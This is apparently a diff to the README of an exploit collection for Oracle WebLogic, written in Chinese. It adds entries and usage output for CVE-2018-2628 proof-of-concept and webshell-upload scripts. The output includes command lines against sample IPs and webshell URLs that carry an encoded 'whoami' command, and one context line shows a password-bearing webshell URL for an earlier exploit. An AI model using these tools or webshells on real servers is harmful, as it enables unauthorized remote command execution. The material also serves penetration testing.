@@ -8,11 +8,13 @@
 [**cve-2017-3506_webshell.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic wls-wsat 远程命令执行漏洞利用，上传Webshell[[使用]](https://freeerror.org/d/468)  
 [**cve-2017-10271_poc.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic wls-wsat XMLDecoder 反序列化漏洞[[使用]](https://freeerror.org/d/460)  
 [**cve-2017-10271_webshell.jar**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic wls-wsat XMLDecoder 反序列化漏洞利用脚本[[使用]](https://freeerror.org/d/460)  
+[**cve-2018-2628_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic WLS Core Components 反序列化命令执行漏洞验证脚本[[使用]](https://freeerror.org/d/464)  
+[**cve-2018-2628_webshell.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) 	Weblogic WLS Core Components 命令执行漏洞上传Webshell脚本[[使用]](https://freeerror.org/d/464)  
 [**cve-2018-2893_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) WebLogic WLS 核心组件反序列化漏洞检测脚本  
 [**cve-2018-2893_cmd.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) WebLogic WLS 核心组件反序列化漏洞利用脚本  
 [**cve-2018-2894_poc_exp.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/)	Weblogic 任意文件上传漏洞检测+利用  
 [**cve-2019-2618_webshell.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic 任意文件上传漏洞(需要账户密码)[[使用]](https://freeerror.org/d/469)  
-[**cve-2020-2551_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic IIOP 反序列化漏洞检测脚本 
+[**cve-2020-2551_poc.py**](https://github.com/zhzyker/exphub/blob/master/weblogic/) Weblogic IIOP 反序列化漏洞检测脚本
 
 # Readme
 部分脚本文件使用说明，详细使用分析请参考[vulnerability-list](https://github.com/zhzyker/exphub/tree/master/weblogic#vulnerability-list)中的[使用]
@@ -184,6 +186,42 @@
 > [*] pwned! Go ahead...
 > 
 > [+] -u/bea_wls_internal/http://59.110.214.109:7001?password=secfree&command=whoami
+> ```
+
+## cve-2018-2628_poc.py Weblogic WLS Core Components 反序列化命令执行漏洞验证脚本[[使用]](https://freeerror.org/d/464)
+> ```
+> zhzy@debian:$ python cve-2018-2628_poc.py 
+> +--------------------------------------------------------+
+> + USE: python cve-2018-2628_poc.py <ip> <port>           +
+> + VER: Oracle WebLogic Server 10.3.6.0                   +
+> +      Oracle WebLogic Server 12.2.1.2                   +
+> +      Oracle WebLogic Server 12.2.1.3                   +
+> +      Oracle WebLogic Server 12.1.3.0                   +
+> + EXP: python cve-2018-2628_poc.py 1.1.1.1 7001          +
+> +--------------------------------------------------------+
+> ```
+
+## cve-2018-2628_webshell.py Weblogic WLS Core Components 命令执行漏洞上传Webshell脚本[[使用]](https://freeerror.org/d/464)
+> USE:
+> ```
+> zhzy@debian:$ python cve-2018-2628_webshell.py 
+> +---------------------------------------------------------------+
+> + USE: python cve-2018-2628_webshell.py <ip> <port> <webshell>  +
+> + VER: Oracle WebLogic Server 10.3.6.0                          +
+> +      Oracle WebLogic Server 12.2.1.2                          +
+> +      Oracle WebLogic Server 12.2.1.3                          +
+> +      Oracle WebLogic Server 12.1.3.0                          +
+> + EXP: python cve-2018-2628_webshell.py 1.1.1.1 7001 shell1.jsp +
+> +---------------------------------------------------------------+
+> ```
+> EXP:
+> ```
+> zhzy@debian:$ python cve-2018-2628_webshell.py 1.1.1.11 7001 shell1.jsp
+> [*] handshake successful
+> [*] usage: python cve-2018-2628.py ip port shell1.jsp
+> [+] Shell Dir: servers\AdminServer\tmp\_WL_internal\bea_wls_internal\9j4dqk\war\shell1.jsp
+> 
+> [+] Webshell: http://1.1.1.1:7001/bea_wls_internal/shell1.jsp?tom=d2hvYW1pCg==
 > ```
 
 ## cve-2018-2893_poc.py WebLogic WLS 核心组件反序列化漏洞检测脚本
